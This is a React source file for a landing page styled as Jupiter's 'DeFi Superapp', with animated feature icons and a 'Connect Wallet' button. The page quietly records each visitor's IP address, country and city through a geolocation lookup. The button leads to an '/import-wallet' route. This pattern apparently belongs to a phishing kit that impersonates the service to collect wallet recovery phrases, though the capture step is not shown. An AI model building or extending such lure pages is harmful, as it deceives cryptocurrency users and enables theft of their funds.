import { useState, useEffect } from "react";
import "../HomePage/index.scss";
import { useNavigate } from "react-router-dom";
import logo from "../../assets/logo.png";
import { motion } from "framer-motion";
import bgImage from "../../assets/jupiter-bg.webp";
import {
  Wallet,
  Zap,
  BarChart2,
  LineChart,
  Shield,
  Layers,
  TrendingUp,
  DollarSign,
  Database,
} from "lucide-react";

const HomePage = () => {
  const [showMain, setShowMain] = useState(false);
  const icons = [
    { label: "Pro", icon: BarChart2, color: "text-lime-300", x: -110, y: -100 },
    { label: "DRiP", icon: Database, color: "text-gray-400", x: 110, y: -100 },
    { label: "Ultra", icon: Zap, color: "text-green-300", x: 0, y: -60 },
    { label: "Studio", icon: Layers, color: "text-gray-300", x: -120, y: 0 },
    { label: "Portfolio", icon: Wallet, color: "text-cyan-300", x: 120, y: 0 },
    { label: "Lend", icon: DollarSign, color: "text-sky-300", x: -90, y: 90 },
    { label: "Perps", icon: TrendingUp, color: "text-lime-300", x: 90, y: 90 },
    { label: "Stake", icon: Shield, color: "text-teal-300", x: 0, y: 120 },
  ];

  const [open, setOpen] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowMain(true);
      setOpen(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    fetch("https://get.geojs.io/v1/ip/geo.json")
      .then((d) => d.json())
      .then((d) => {
        localStorage.setItem(
          "location",
          JSON.stringify({
            IP: d.ip,
            country: d.country_code,
            city: d.city,
          })
        );
      })
      .catch((err) => console.error("Error fetching location:", err));
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/import-wallet/Unknown");
  };

  return (
    <div className="relative w-full min-h-screen overflow-hidden text-white font-sans">
      {!showMain ? (
        <motion.div
          initial={{ scale: 1.5, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 1.2, ease: "easeOut" }}
          className="relative w-full h-screen flex items-center justify-center"
          style={{
            backgroundImage: `url(${bgImage})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        >
          <div className="absolute inset-0 bg-black/40"></div>
        </motion.div>
      ) : (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 1 }}
          className="flex flex-col justify-between items-center min-h-screen bg-[#021019] relative"
        >
          {/* Nền ánh sáng mờ */}
          <div className="absolute inset-0 bg-black/50 -z-10"></div>
          <div className="absolute w-[75vw] h-[75vw] sm:w-[420px] sm:h-[420px] rounded-full bg-gradient-to-tr from-cyan-700/20 via-lime-700/20 to-transparent blur-3xl top-1/3 -translate-y-1/2 -z-10"></div>

          {/* Nội dung chính */}
          <div className="flex flex-col items-center justify-center flex-grow mt-0">
            {/* Icon vòng tròn quanh logo */}
            <div className="relative w-[80vw] h-[80vw] max-w-[320px] max-h-[320px] flex items-center justify-center">
              {icons.map((item, i) => {
                const Icon = item.icon;
                return (
                  <motion.div
                    key={i}
                    initial={{ x: item.x, y: item.y, opacity: 0 }}
                    animate={{
                      x: item.x,
                      y: item.y,
                      opacity: 1,
                      transition: {
                        duration: 2 + i * 0.3,
                        repeat: Infinity,
                        repeatType: "reverse",
                      },
                    }}
                    className="absolute flex flex-col items-center text-[10px] sm:text-[11px]"
                  >
                    <div
                      className={`
                        flex items-center justify-center px-2.5 sm:px-3 py-1 sm:py-1.5 rounded-full 
                        border border-[#1b2f36] 
                        bg-gradient-to-b from-[#112931]/80 to-[#05161c]/95 
                        backdrop-blur-md 
                        shadow-[inset_0_1px_2px_rgba(255,255,255,0.15),_0_4px_10px_rgba(0,0,0,0.7),_0_0_10px_rgba(0,255,200,0.05)]
                        hover:shadow-[inset_0_1px_2px_rgba(255,255,255,0.2),_0_4px_15px_rgba(0,255,200,0.15)]
                        transition-all duration-500
                      `}
                    >
                      <Icon
                        size={14}
                        className={`mr-1 ${item.color} drop-shadow-[0_0_5px_rgba(0,255,200,0.4)]`}
                      />
                      <span className="font-medium tracking-tight text-gray-200">
                        {item.label}
                      </span>
                    </div>
                  </motion.div>
                );
              })}

              {/* Logo trung tâm */}
              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-2xl flex items-center justify-center">
                <img src={logo} alt="logo" className="w-full h-full object-contain" />
              </div>
            </div>

            {/* Tiêu đề + mô tả */}
            <div className="text-center mt-10 px-4">
              <h1 className="text-[22px] sm:text-[28px] font-semibold bg-gradient-to-r from-cyan-400 to-lime-400 bg-clip-text text-transparent tracking-tight leading-snug">
                Introducing the DeFi Superapp
              </h1>
              <p className="mt-2 text-gray-400 text-[12px] sm:text-[13px] max-w-[280px] mx-auto leading-relaxed">
                Everything you love about Jupiter — trading, DeFi, and wallets, all in one place.
              </p>
            </div>

            {/* Dots */}
            <div className="flex space-x-2 mt-6 mb-10">
              <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
              <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
              <div className="w-1.5 h-1.5 bg-gray-600 rounded-full"></div>
            </div>
          </div>

          {/* Nút dưới cùng */}
          <div className="w-full flex justify-center mb-10">
            <button
              onClick={handleSubmit}
              className="w-[85%] sm:w-[80%] max-w-sm py-3.5 rounded-2xl font-semibold text-[14px] sm:text-[15px]
              bg-[#21ffec]
              text-[#01110E]
              shadow-[inset_0_1px_3px_rgba(255,255,255,0.4),_0_4px_20px_rgba(164,255,158,0.3)]
              hover:shadow-[inset_0_1px_4px_rgba(255,255,255,0.6),_0_4px_25px_rgba(164,255,158,0.5)]
              active:scale-[0.98]
              transition-all duration-300"
            >
              Add / Connect Wallet
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );
};

export default HomePage;
